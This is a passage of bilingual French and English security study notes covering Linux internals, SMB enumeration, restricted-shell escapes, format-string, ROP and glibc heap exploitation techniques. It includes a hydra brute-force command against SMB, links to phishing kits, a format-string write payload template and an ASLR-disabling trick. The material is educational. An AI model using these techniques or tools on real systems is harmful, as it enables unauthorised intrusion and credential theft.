    > extra information about the users ( user's full name, phone
    > number, ...).**

> **This field is used by finger command for**
>
> **fetching.**

-   **:/root: : Home directory: The absolute path to the directory the
    > user will be in when they log in. If this directory does not exist
    > then users directory becomes /.**

-   **:/bin/bash: : Command/shell: The absolute path of a command or
    > shell (/bin/bash). Typically, this is a shell.**

## Some Environment variables in Linux:

  -----------------------------------------------------------------------
  **LD_LIBRARY_PATH**                 **Indicates differents directories
                                      to search for libraries.**
  ----------------------------------- -----------------------------------
  **LD_PRELOAD**                      **Specify a library which will be
                                      loaded prior to any library when
                                      the program gets executed.**

  -----------------------------------------------------------------------

-   ## Fonctionnement de la HEAP ( glibc heap ):

    -   **The way the heap works is very platform and implementation
        > specific ( example : The default *glibc* heap implementation
        > in *Linux* is also very different to how the heap works in
        > *Windows )***

```{=html}
<!-- -->
```
-   ### Some basic HEAP rules:

+------------------------------------------+---------------------------+
| **Rule**                                 | **Can lead to \...**      |
+==========================================+===========================+
| **Don't read or write to a pointer       | **Use After Free**        |
| returned by malloc ( and like-malloc     |                           |
| functions ) after that pointer has been  |                           |
| passed back to free**                    |                           |
+------------------------------------------+---------------------------+
| **Don't use or leak uninitialized        | **Information leaks ,     |
| information in a heap allocation (       | uninitialized data        |
| Exception for calloc ).**                | Vuln.**                   |
+------------------------------------------+---------------------------+
| **Don't read or write bytes after the    | **Heap overflow, read     |
| end of an allocation.**                  | beyond bounds Vuln.**     |
+------------------------------------------+---------------------------+
| **Don't pass a pointer that originated   | **Double Free Vuln.**     |
| from malloc ( and like-malloc functions  |                           |
| ) to free more than one.**               |                           |
+------------------------------------------+---------------------------+
| **Don't read or write bytes before the   | **Heap underflow Vuln.**  |
| beginning of an allocation.**            |                           |
+------------------------------------------+---------------------------+
| **Don't pass a pointer that didn't       | **Invalide free Vuln.**   |
| originate from malloc to free.**         |                           |
+------------------------------------------+---------------------------+
| **Don't use a pointer returned by malloc | **Null-dereference bugs** |
| ( and like-malloc functions ) before     |                           |
| checking if the function returned        | **arbitrary write Vuln**  |
| NULL.**                                  |                           |
+------------------------------------------+---------------------------+

###  Spécification :

-   **The heap manager also needs to store metadata about the
    > allocation.**

![](media/image96.png){width="3.9703083989501313in"
height="2.989408355205599in"}

-   **The heap manager also needs to ensure that the allocation will be
    > 8-byte aligned on 32-bit systems, or 16-byte aligned on 64-bit
    > systems. So some paddings bytes are stored when it's needed.**

> **Many functions ( like "system" or "exec" in C) can drop Setuid
> privilege for security reasons.**

##  Some important file in Linux system

+-----------------------------------+-----------------------------------+
| **.\[ sh \| zsh \| ksh \| bash    | **Provide a place where you can   |
| \]rc**                            | set up variables, functions and   |
|                                   | aliases, define your prompt and   |
|                                   | define other settings that you    |
|                                   | want to use every time you open a |
|                                   | new terminal window.**            |
+===================================+===================================+
| **.\[ sh \| zsh \| ksh \| bash    | **Comme .\[\]rc, sauf qu'il est   |
| \]\_profile**                     | exécuté pour les login shell,     |
|                                   | c\'est à dire là où vous          |
|                                   | saisissez votre login et mot de   |
|                                   | passe.**                          |
|                                   |                                   |
|                                   | **C\'est par exemple le cas lors  |
|                                   | de votre première connexion au    |
|                                   | démarrage de votre machine ou     |
|                                   | lors d\'une connexion SSH.**      |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   ## SMB Penetration Testing (Port 445)

```{=html}
<!-- -->
```
-   Le logiciel Samba est un outil permettant de partager des dossiers
    > et des imprimantes à travers un réseau local. Il permet de
    > partager et d\'accéder aux ressources d\'autres ordinateurs
    > fonctionnant avec d'autres systèmes d\'exploitation dans lesquels
    > une implémentation de Samba est installée.

> Il implémente le protocol SMB ( Server Message Block ) ( port 139 et
> 445 ).
>
> Some Bamba command

  -----------------------------------------------------------------------
  smbclient                           Find the shares which we can access
  \\\\\\\\\[IP\]\\\\sambashare        without creds
  ----------------------------------- -----------------------------------
  get \[NAME_FILE\]                   Une fois rentré dans les fichiers
                                      partagés ,on peut récupérer un
                                      fichier avec cette commande.

  smbclient //\[IP\]/LOCUS_LAN\$      Accède au fichier "LOCUS_LAN"

                                      
  -----------------------------------------------------------------------

**The SMB protocol supports two levels of security. The first is the
share level. The server is protected at this level and each share has a
password. The client computer or user has to enter the password to
access data or files saved under the specific share.**

**During the enumeration phase ( of this functionality ), generally, we
go for banner grabbing to identify a vulnerable version of the running
service and the host operating system. You can do this via nmap :**

![](media/image93.png){width="4.75in" height="0.5104166666666666in"}

**There are so many automated scripts and tools available for SMB
enumeration.**

**If you get fail to enumerate the vulnerable state of SMB or found a
patched version of SMB in the target machine, then we have "Brute force"
as another option to gain unauthorized access to a remote machine.**

![](media/image270.png){width="4.854166666666667in"
height="0.5416666666666666in"}

**hydra -L user.txt -P pass.txt 192.168.1.101 smb**

![](media/image269.png){width="5.5in" height="2.9166666666666665in"}

##  Phishing tools

  ----------------------------------------------------------------------------------------
  **AdvPhising**                      **https://github.com/Ignitetch/AdvPhishing**
  ----------------------------------- ----------------------------------------------------
  **Shellphish**                      **https://github.com/kaankadirkilic/shellphish-1**

  **Evilginx2**                       **https://github.com/kgretzky/evilginx2**

                                      

                                      
  ----------------------------------------------------------------------------------------

##  File System in Linux

+-----------------------------------+-----------------------------------+
| -   **/**                         | -   **Every single file and       |
|                                   |     > directory starts from this  |
|                                   |     > root directory.**           |
|                                   |                                   |
|                                   | -   **Only the root user has      |
|                                   |     > write privilege under this  |
|                                   |     > directory.**                |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Please note that /root is   |
|                                   |     > the root user's home        |
|                                   |     > directory, which is not the |
|                                   |     > same as /.**                |
+===================================+===================================+
| -   **/bin**                      | -   **Contains binary             |
|                                   |     > executables.**              |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Common linux commands you   |
|                                   |     > need to use in single-user  |
|                                   |     > modes are located under     |
|                                   |     > this directory.**           |
|                                   |                                   |
|                                   | -   **Commands used by all the    |
|                                   |     > users of the system are     |
|                                   |     > located here.**             |
+-----------------------------------+-----------------------------------+
| -   **/sbin**                     | -   **Just like /bin, /sbin also  |
|                                   |     > contains binary             |
|                                   |     > executables.**              |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **But, the linux commands     |
|                                   |     > located under this          |
|                                   |     > directory are used          |
|                                   |     > typically by system         |
|                                   |     > administrators, for system  |
|                                   |     > maintenance purposes (      |
|                                   |     > ipatables,                  |
|                                   |     > ifconfig,\...).**           |
+-----------------------------------+-----------------------------------+
| -   **/etc**                      | -   **Contains configuration      |
|                                   |     > files required by all       |
|                                   |     > programs.**                 |
|                                   |                                   |
|                                   | -   **This also contains startup  |
|                                   |     > and shutdown shell scripts  |
|                                   |     > used to start/stop          |
|                                   |     > individual programs.**      |
+-----------------------------------+-----------------------------------+
| -   **/dev**                      | -   **Contains device files.**    |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **These include terminal      |
|                                   |     > devices, usb, or any device |
|                                   |     > attached to the system.**   |
+-----------------------------------+-----------------------------------+
| -   **/proc**                     | -   **Contains information about  |
|                                   |     > system process.**           |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **This is a pseudo file       |
|                                   |     > system containing           |
|                                   |     > information about running   |
|                                   |     > process ( /proc/{pid}       |
|                                   |     > )\...**                     |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **This is a virtual           |
|                                   |     > filesystem with text        |
|                                   |     > information about system    |
|                                   |     > resources.**                |
+-----------------------------------+-----------------------------------+
| -   **/var**                      | -   **"var" stands for *variable  |
|                                   |     > files*.**                   |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Content of the files that   |
|                                   |     > are expected to grow can be |
|                                   |     > found under this            |
|                                   |     > directory.**                |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **This includes :**           |
|                                   |                                   |
|                                   |     -   **System log file         |
|                                   |         > (/var/log)**            |
|                                   |                                   |
|                                   |     -   **Packages and database   |
|                                   |         > files (/var/lib)**      |
|                                   |                                   |
|                                   |     -   **Emails (/var/mail)**    |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Temp files needed across    |
|                                   |     > reboots (/var/tmp)**        |
+-----------------------------------+-----------------------------------+
| -   **/tmp**                      | -   **Directory that contains     |
|                                   |     > temporary files created by  |
|                                   |     > system and users.**         |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Files under this directory  |
|                                   |     > are deleted when the system |
|                                   |     > is rebooted.**              |
+-----------------------------------+-----------------------------------+
| -   **/usr**                      | -   **Contains binaries,          |
|                                   |     > libraries, documentation,   |
|                                   |     > and source-code for second  |
|                                   |     > level programs.**           |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **/usr/bin contains binary    |
|                                   |     > files for user programs. If |
|                                   |     > you can't find a user       |
|                                   |     > binary under /bin, look     |
|                                   |     > under /usr/bin ( same as    |
|                                   |     > /sbin and /usr/sbin ).**    |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **/usr/lib contains libraries |
|                                   |     > for /usr/bin and            |
|                                   |     > /usr/sbin**                 |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **/usr/local contains users   |
|                                   |     > programs that you install   |
|                                   |     > from source. For example,   |
|                                   |     > when you install apache     |
|                                   |     > from source, it goes under  |
|                                   |     > /usr/local/apache2**        |
+-----------------------------------+-----------------------------------+
| -   **/home**                     | -   **Home directories for all    |
|                                   |     > users to store their        |
|                                   |     > personal files.**           |
+-----------------------------------+-----------------------------------+
| -   **/boot**                     | -   **Contains boot loader        |
|                                   |     > related files.**            |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Kernel initrd, vmlinux,     |
|                                   |     > grub files are located      |
|                                   |     > under /boot**               |
+-----------------------------------+-----------------------------------+
| -   **/lib**                      | -   **Contains library files that |
|                                   |     > supports the binaries       |
|                                   |     > located under /bin and      |
|                                   |     > /sbin**                     |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Library filenames are       |
|                                   |     > either ld\* or              |
|                                   |     > lib\*.so.\***               |
+-----------------------------------+-----------------------------------+
| -   **/opt**                      | -   **"opt" stands for            |
|                                   |     > optional.**                 |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Contains add-on             |
|                                   |     > applications from           |
|                                   |     > individual vendors.**       |
+-----------------------------------+-----------------------------------+
| -   **/mnt**                      | -   **Temporary mount directory   |
|                                   |     > where sysadmins can mount   |
|                                   |     > filesystems.**              |
+-----------------------------------+-----------------------------------+
| -   **/media**                    | -   **Temporary mount directory   |
|                                   |     > for removable devices.**    |
+-----------------------------------+-----------------------------------+
| -   **/srv**                      | -   **"srv" stands for service.** |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **Contains server specific    |
|                                   |     > services related data.**    |
|                                   |                                   |
|                                   | ```{=html}                        |
|                                   | <!-- -->                          |
|                                   | ```                               |
|                                   | -   **For example, /srv/cvs       |
|                                   |     > contains CVS related        |
|                                   |     > data.**                     |
+-----------------------------------+-----------------------------------+
|                                   |                                   |
+-----------------------------------+-----------------------------------+

-   **le dossier ﻿/*dev*/*input*/ est liée aux inputs de tous les devices
    > extérieures connectés ( souris, clavier, ...)**

```{=html}
<!-- -->
```
-   **Sur une machine Ubuntu, un message de bienvenue accueille
    > l\'utilisateur lors d\'une connexion en ligne de commande (SSH)
    > .**

**Ce message est nommé le message du jour (motd).**

**Si on obtient les droits d'écritures sur le répertoire liée à ce**

**système, on peut prendre le contrôle de l'utilisateur root.**

-   ## Shell restreint

**Un shell restreint (restricted shell) est un shell système, modulable
de**

**sorte à restreindre les possibilités des utilisateurs. Un tel shell
est utilisé**

**en général au moment où l\'administrateur doit créer un compte pour
un**

**utilisateur à qui il ne fait pas complètement confiance.**

**La plupart des programmes n\'ont pas hélas été écrits pour travailler
avec**

**les shells restreints ( telnet, mail, ftp, less, more, vi, gdb, lynx
). Certains**

**d\'entre eux contiennent une fonction intégrée, permettant d\'appeler
le shell**

**normal (shell escape). Cette fonction est en général appelée à l\'aide
du**

**caractère " *!* ".**

**Nous pouvions nous attendre à ce que les commandes transférées
soient**

**exécutées en se basant sur le shell défini dans la variable SHELL --
dans**

**notre cas /bin/rbash. Hélas, ce n\'est pas toujours le cas. Une partie
de ces**

**programmes ne tient pas compte des variables d\'environnement et ils**

**exécutent les commandes transférées à l\'aide du shell /bin/bash ou
bien**

**/bin/sh.**

**L'escape passe parfois par le modification de la variable
d\'environnement**

**\$SHELL ( en /bin/bash ).**

-   **Modifier les droits des fichiers et des répertoires**

**Si l\'administrateur se trompe et rend disponible la commande chmod,
il se**

**peut que l\'utilisateur attribue le droit +w au répertoire personnel,
ce qui**

> **l\'autorisera à supprimer le fichier .bash_profile. À la prochaine
> connexion, la variable PATH ne sera pas restreinte à /usr/local/rbin
> et donc il est fort probable que le chemin contiendra le répertoire
> /bin (ce qui permettra de lancer le bash normal).**
>
> **Il est parfois possible de modifier les droits sans utiliser le
> programme /bin/chmod ( par exemple avec FTP, si on a accès à ce
> service, l\'utilisateur peut faire la commande chmod 777 après s\'être
> connecté au port 21 pour supprimer facilement le fichier .bash_profile
> ou l\'écraser avec un autre.. )**

-   **Interrompre le script de démarrage**

-   

**Les administrateurs créent souvent des scripts de démarrage développés
et**

**oublient la gestion de signaux.**

> ![](media/image3.png){width="5.5in" height="3.1145833333333335in"}

**Sur ce script, Il suffit que l\'utilisateur appuie sur les touches
\[CTRL\]+\[C\]**

**lors de la commande sleep 5 et le script s\'arrêtera alors
immédiatement avant de mettre en place rbin. l\'utilisateur ne sera donc
pas limité aux**

**commandes du répertoire rbin.**

-   **Téléchargement de la bibliothèque**

**Une méthode intéressante pour quitter le shell restreint, capable de
réussir,**

**consiste à charger la bibliothèque spécialement préparée ( shared
library**

**hijacking ).**

![](media/image60.png){width="3.5989588801399823in"
height="2.912716535433071in"}

**Common Exploitation Techniques**

![](media/image342.png){width="5.9375in" height="3.2291666666666665in"}

![](media/image47.png){width="5.895833333333333in"
height="5.072916666666667in"}

![](media/image363.png){width="5.270833333333333in" height="3.21875in"}

![](media/image261.png){width="5.555220909886264in"
height="3.9218755468066493in"}

**\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\--**

-   

## /etc/shadow file fields

![](media/image324.png){width="7.716330927384077in"
height="4.550328083989501in"}

-   ## Système de volume logique de linux

![](media/image6.png){width="5.458333333333333in"
height="2.9791666666666665in"}

**Une image à peu près similaire :**

![](media/image369.png){width="6.267716535433071in"
height="1.9027777777777777in"}

**UNIX-like operating systems distinguish between processes running
within the kernel (running in kernel mode) and processes started by
users (running in user mode) including the special user root. Memory
belonging to the kernel can be accessed via the device files (/dev/kmem)
and (/dev/mem).**

## Shared Library Hijacking :

![](media/image44.png){width="5.889763779527559in" height="6.625in"}

-   we can add:

    -   Verify if DT_RUNPATH and DT_RPATH are set : echo \$DT_RUNPATH ;
        > echo \$DT_RPATH.

    -   Test LD_PRELOAD (But you can't execute arbitrary SUID libraries
        > with this variable for security reasons).

![](media/image388.png){width="2.5953083989501313in"
height="4.329195100612424in"}

with LD_PRELOAD not mentioned

## MISC

![](media/image319.png){width="5.889763779527559in"
height="2.7083333333333335in"}

-   The encodage "Base64 without padding" consists of removing the "="
    > at the end and replacing "+" and "/" by "\_".

```{=html}
<!-- -->
```
-   Booter en *mode single user* sous Linux permet d\'être connecté
    > directement en root sans taper de mot de passe. C\'est très utile
    > quand on a perdu le mot de passe root ou que le système refuse de
    > booter correctement, car on est dans un mode minimaliste avec peu
    > de choses démarrées.

À noter que dans ce mode, les modifications sont temporaires. Elles ne
sont

pas enregistrées sur le disque et seront perdues au prochain reboot.

Linux permet néanmoin de configurer la demande le mot de passe root

même en mode *single-user*.

-   All users had their home directory in /home (which is very common).
    > However, it\'s not always the case (especially for service
    > accounts). You can find the location of this home directory of
    > each user by inspecting /etc/passwd.

```{=html}
<!-- -->
```
-   Administrators often leave files in /tmp as /tmp gets cleanup after
    > each reboot.

> Therefore, it\'s really important when auditing or gaining access to a
> system to see what files you can find in /tmp.
>
> Also administrators often leave files in /var/tmp. But the directory
> /var/tmp does not get cleanup after each reboot.

-   The sticky bit ( drwxrwxrwt ) only allows the user who created a
    > file in this directory (or the owner of the directory, ie: root)
    > to modify this file.

```{=html}
<!-- -->
```
-   A vulnerability assessment is designed to find as many flaws as
    > possible in order to make a prioritized list of remediation items

-   A penetration test is designed to see if a mature defense can stop
    > an attacker from achieving one or more specific goals.

-   A red team engagement is designed to continuously test and improve
    > the effectiveness of a company's blue team by mimicking real-world
    > attackers.

> A Red Team Assessment is similar to a penetration test in many ways
> but is more targeted. The goal of the Red Team Assessment is NOT to
> find as many vulnerabilities as possible. The goal is to test the
> organization\'s detection and response capabilities.

-   Ninja = Red team

> Pirate = Pentest

-   When specified at compile time the RPATH ( or RUNPATH ) path is
    > embedded in the binary and is the first path searched when
    > searching for a library.

```{=html}
<!-- -->
```
-   A calling convention is a set of rules dictating how function calls
    > work at the machine level ( assembler ). It is defined by the
    > Application Binary Interface (ABI) for a particular system. For
    > example :

> Should the parameters be passed through the stack, in registers, or
> both?
>
> Should the parameters be passed in from left-to-right or
> right-to-left?
>
> Should the return value be stored on the stack, in registers, or both?
>
> There are many calling conventions, but the popular ones are CDECL,
> STDCALL, THISCALL, and FASTCALL.
>
> ![](media/image94.png){width="4.9375in" height="1.6875in"}

-   In x86-64, memory addresses are 64 bits long but user space only
    > uses the first 47 bits. If you specify an address above
    > 0x00007fffffffffff, you'll raise an exception.

```{=html}
<!-- -->
```
-   When an executable file has its setuid bit enabled, it allows anyone
    > to execute the program with the same permissions as the file's
    > owner.

# Linux Hardening Rules

+-----------------------+-------------------------+--------------------+
| Règles                | Raison                  | Moyens de          |
|                       |                         | vérification       |
+=======================+=========================+====================+
| Ne jamais utiliser le | Il est essentiel de     | Vérifier les       |
| mot NOPASSWD pour les | laisser cette barrière  | sudoers file       |
| règles sudoers        | de protection de        | présent sur le     |
|                       | l'écriture du mot de    | serveur et look si |
|                       | passe pour des          | le mot NOPASSWD    |
|                       | commandes demandant des | est présent        |
|                       | droits sudoers          |                    |
+-----------------------+-------------------------+--------------------+
| Seuls les composants  | -   Réduire la surface  | -   Look les       |
| strictement           |     > d'attaque au      |     > services en  |
| nécessaires au        |     > strict minimum    |     > écoute sur   |
| service rendu par le  |                         |     > les ports et |
| système doivent       | -   Permettre une mise  |     > comprendre   |
|                       |     > à jour et un      |     > chacun des   |
| être installés        |     > suivi du système  |     > services     |
|                       |     > efficace          |     > présents     |
|                       |                         |                    |
|                       | -                       |                    |
+-----------------------+-------------------------+--------------------+
|                       |                         |                    |
+-----------------------+-------------------------+--------------------+
|                       |                         |                    |
+-----------------------+-------------------------+--------------------+
|                       |                         |                    |
+-----------------------+-------------------------+--------------------+

#  PWN - Exploit mistakes in programming and execution

-   ## Memory leak

    -   **A memory leak is bad because it can eat the entire RAM. You
        > don\'t know how much time user will** remain until your
        > **application or** service is opened**. It might be for
        > minutes, hours, days or even months, and once an user has
        > opened your software, if you didn\'t implement your software
        > in the right way to prevent memory leaks, you can disturb the
        > user or even crash the OS!**

    -   

```{=html}
<!-- -->
```
-   ## ﻿Exploits de type "format strings":

```{=html}
<!-- -->
```
-   **Cette exploit peut se faire lorsque l'utilisateur n'utilise pas
    > correctement les fonctions de la famille *printf* ( avec les
    > opérateurs ).**

> **Exemple avec printf :**
>
> **﻿printf(user_input) A LA PLACE DE ﻿printf(\"%s\", user_input);**
>
> ![](media/image247.png){width="2.6458333333333335in"
> height="1.40625in"}

-   **formateur %u : entier non-signé.**

-   **formateur %x : hexa.**

-   **formateur %c : unique caractère.**

-   **formateur %f : nombre à virgule.**

-   **formateur %s : chaine de caractère.**

-   **formateur %n : nombre de bytes écrites jusqu'à ici.**

```{=html}
<!-- -->
```
-   **Il existe 2 types de formateurs :**

    -   **formateur "directs" : Affiche tout simplement la valeur sur
        > laquelle il se trouve ( dans la pile ) comme le formateur
        > %x.**

```{=html}
<!-- -->
```
-   **formateur "pointeurs" : Afficher la valeur POINTÉE par la valeur
    > qu\'il cible comme le formateur %s,%n \...**

-   **le formateur %n écrit dans la mémoire le nombre de caractères déjà
    > affiché par la fonction à l'adresse qu'il pointe sur la stack.**

```{=html}
<!-- -->
```
-   **le formateur %hn écrit 2 octets à la place de 4 octet ( comme le
    > fait %n )**

```{=html}
<!-- -->
```
-   **"%5\$n" : Cela veut dire : \"le cinquième élément de 4 octets sur
    > la pile est un %n". Cette notation est équivalente à "%x%x%x%x%n"
    > mis à part que les 4 premières valeurs pointées par les %x ne
    > s\'afficheront pas.**

```{=html}
<!-- -->
```
-   **"%XXXXd" : Génère un entier de taille XXXX digit.**

```{=html}
<!-- -->
```
-   **Pour écrire dans la mémoire avec une exploit de type string, il
    > faut envoyer ca a une fonction vulnérable :**

> **"\[ adresse Ou tu veux écrire \] + \[ ceux que tu veux écrire à
> l'adresse voulu\] + %\[EMPLACEMENT SUR LA PILE DE L'ADRESSE\]\$n".**

-   **Pour exécuter un programme sur GDB et sur l'OS avec le même
    > environnement :**

![](media/image409.png){width="8.272339238845145in"
height="3.119792213473316in"}

-   ## L'ASLR

###  Définition

> **ASLR (pour Address Space Layout Randomization) ! Il s'agit d'une
> protection qui fait varier les adresses de certaines zones mémoires
> (mais pas toutes) à chaque lancement du programme.**

![](media/image330.png){width="6.267716535433071in"
height="3.611111111111111in"}

-   ### Bypass ASRL :

    -   Brute Force.

    -   Any user, able to run 32-bit applications in a x86 machine, can
        > disable the ASLR by setting the RLIMIT_STACK resource to
        > unlimited ( still present in few system Linux): ulimit -s
        > unlimited

    -   Utiliser un Offset par rapport à une adresse connu.

    -   Utiliser des exploits bypassant le ASLR ( comme ROP )

-   **PIE : ASLR sur d'autres sections du programme.**

```{=html}
<!-- -->
```
-   ## SSP ( stack smashing protector )

![](media/image315.png){width="6.267716535433071in"
height="4.680555555555555in"}

![](media/image22.png){width="6.267716535433071in"
height="2.9166666666666665in"}

-   ## RELRO

![](media/image264.png){width="7.820497594050743in"
height="5.387141294838146in"}

-   ## Use-After-Free : 

    -   **Exploitation pouvant être utilisée si une personne après un
        > free() ne met pas le pointeur à NULL. Le pointeur reste actif
        > et pointe toujours vers la même adresse mémoire.**

-   ## Return-to-libc : 

    -   **Au lieu de modifier l'adresse de retour pour qu'elle pointe
        > sur un shellcode placé dans la pile, l'idée est de la modifier
        > pour qu'elle pointe directement sur la fonction de la
        > bibliothèque libc system(). Le but est d'appeler la fonction
        > system(/bin/sh) pour obtenir un shell.**

> **Cette attaque peut-être stoppée par l'ASLR.**
>
> ![](media/image334.png){width="2.869792213473316in"
> height="3.372937445319335in"}

-   **Pour trouver l'adresse de certaines fonctions, on peut utiliser
    > cette commande sur gdb:**

> ![](media/image371.png){width="4.84375in"
> height="0.3854166666666667in"}

-   **Une protection contre cette exploitation ( Return-to-libc ) est
    > l'ajout d'un byte 0 dans les adresses libc, empêchant notre
    > exploit de faire passer le payload entier au programme
    > vulnérable.**

> **Cette protection est contournable.**

-   ## ROP - Return Oriented Programming

```{=html}
<!-- -->
```
-   **Le ROP consiste à utiliser les instructions machines présentes
    > dans le segment .text (pour rappel, le segment .text contient le
    > code ou plutôt les instructions machines de notre programme).**

> **Ce segment... n'est pas randomisé par l'ASLR.**
>
> **En gros, on va prendre divers petits bouts de code présents dans la
> section .text qui, exécutés dans le bon ordre et avec les bons
> arguments, vont nous permettre d'obtenir ce que nous voulons, à
> savoir, dans le cas présent, un shell.**

![](media/image101.png){width="6.267716535433071in"
height="2.111111111111111in"}

> **Ainsi, lorsque les instructions que nous voulons effectuer ont été
> exécutées, l'instruction RET permet de sauter à l'instruction dont
> l'adresse est sur le dessus de la pile, pile que nous contrôlons grâce
> au buffer overflow.**
>
> **exemple :**

![](media/image336.png){width="6.267716535433071in" height="2.75in"}

**Shellcode en masse :
[[http://shell-storm.org/shellcode/]{.underline}](http://shell-storm.org/shellcode/)**

## Double free :

![](media/image179.png){width="6.403830927384077in"
height="7.352950568678915in"}

-   **Malloc() utilise au minimum 24 bytes comme donnée utilisateur sur
    > chaque chunk de la Heap lors d'une allocation ( même pour un
    > malloc de taille 0 ) sans compter les métadonnées des chunks.**

```{=html}
<!-- -->
```
-   **La taille des métadonnées d'un chunk est de 8 bytes.**

```{=html}
<!-- -->
```
-   **la heap en x64 augmente de 16 en 16 bytes pour les données
    > utilisateurs.**

```{=html}
<!-- -->
```
-   **Each chunk has a size field indicating the size of the chunk.**

![](media/image191.png){width="5.791338582677166in"
height="0.5972222222222222in"}

![](media/image114.png){width="3.3958333333333335in"
height="0.2916666666666667in"}

**example :**

![](media/image370.png){width="2.8541666666666665in"
height="0.7708333333333334in"}

**Ici, sur chaque chunk de couleurs différentes, on a dans les méta
données. le nombre 21 signifie :**

-   **1 =\> le flag n°1. Les 3 derniers bit représentent un flag activé
    > ( see below ). ici, le prev_inuse flag qui est activé.**

-   **0x20: taille du chunk ( 32 bytes ici )**

```{=html}
<!-- -->
```
-   **Since all chunks are multiples of 8 bytes, the 3 LSBs of the chunk
    > size can be used for flags. These three flags are defined as
    > follows:**

-   **A (0x04)**

> **Allocated Arena - the main arena uses the application\'s heap. Other
> arenas use mmap\'d heaps. To map a chunk to a heap, you need to know
> which case applies. If this bit is 0, the chunk comes from the main
> arena and the main heap. If this bit is 1, the chunk comes from
> mmap\'d memory and the location of the heap can be computed from the
> chunk\'s address.**

-   **M (0x02)**

> **MMap\'d chunk - this chunk was allocated with a single call to mmap
> and is not part of a heap at all.**

-   **P (0x01)**

> **Previous chunk is in use - if set, the previous chunk is still being
> used by the application, and thus the prev_size field is invalid.
> Note - some chunks, such as those in fastbins (see below) will have
> this bit set despite being free\'d by the application. This bit really
> means that the previous chunk should not be considered a candidate for
> coalescing - it\'s \"in use\" by either the application or some other
> optimization layered atop malloc\'s original code.**
>
> **Le premier chunk a toujours ce flag activé.**

-   **De base, sur la Heap, il n'y a qu'un seul principal chunk qu'on
    > appelle "Top Chunk". Au fur et à mesure qu'on alloue de la
    > mémoire, ce chunk baisse en taille.**

> **On peut récupérer, comme information sur ce chunk, combien il reste
> de place dans la Heap.**

![](media/image71.png){width="5.791338582677166in"
height="3.888888888888889in"}

![](media/image31.png){width="5.791338582677166in"
height="1.8888888888888888in"}

-   ## The House of Force attack

Publiée en 2005, **Cette attaque se concentre sur la taille affichée en
mémoire du top chunk. Avec un possible Heap Overflow, on peut écraser
cette valeur.**

**On peut alors tromper certaines fonctions comme malloc() qui utilise
cette valeur pour allouer de la mémoire correctement.**

**Cette attaque se base aussi sur le fait que l'on utilise une ancienne
version de la biblio GLIBC ( \< 2.29 ), qui laquelle il n\'y a aucun
check sur la taille du Top chunk.**

**La présence d'une feature que l'on nomme \"tcache\" ( présent sur des
anciennes versions de GLIBC ) rend plus facile des exploit sur
malloc().**

**Etape :**

-   **Heap overflow pour écraser le size field du top chunk. Donc
    > maintenant la heap est très grande.**

-   **Ecrire ou on veut dans les sections du binaire. ( request enough
    > memory to bridge the gap between the top chunk and target data and
    > then overwrite the target with other allocation).**

**On peut même écrire à des adresses plus basses car c'est un système**

**"modulo max_size_or_value".**

**GLIBC version 2.30 introduced a maximum allocation size check, which
limits the size of the gap the House of Force can bridge.**

## Code execution techniques :

-   **For code execution, you can for example overwrite the plt section
    > to overwrite the address of printf() in instance if it's possible
    > if RELRO isn't activated ).**

```{=html}
<!-- -->
```
-   **You can overwrite the .fini_array slots, if you can lead the
    > program into exiting because the process of exiting use the slots
    > of this array ( if RELRO isn't activated ).**

```{=html}
<!-- -->
```
-   **You can overwrite \_\_exit_funcs or tls_dtor_list qui se
    > comportent pareil que .fini_array ( qui se trouvent dans une autre
    > PLT de GLIBC ) mais c'est largement plus dur.**

```{=html}
<!-- -->
```
-   **You can use mallocs hooks : Each of malloc\'s core functions, such
    > as malloc() and free(), has an associated hook which takes the
    > form of a writable function pointer in GLIBC\'s data section.**

> **When the value of the malloc hook is null, it\'s ignored and calls
> to the malloc() function work as normal. When it isn\'t null however,
> calls to malloc() are redirected to the address that it holds.**
>
> **You can find the address of the malloc hook with some general
> variables.**
>
> **If you can replace the malloc hook by system("/bin/sh") for example,
> you can put the argument of the system function in the size malloc
> argument as an address pointing to the correct strings in the memory (
> here "/bin/sh" ). That will trigger the hijacked hook with the right
> argument.**

-   ## The Fastbin dups ( duplication ) attack

**Definitions :**

-   **fastbins : The collection of chunks that have been freed.**

-   **Arenas : Arenas are structures in which malloc keeps all of its
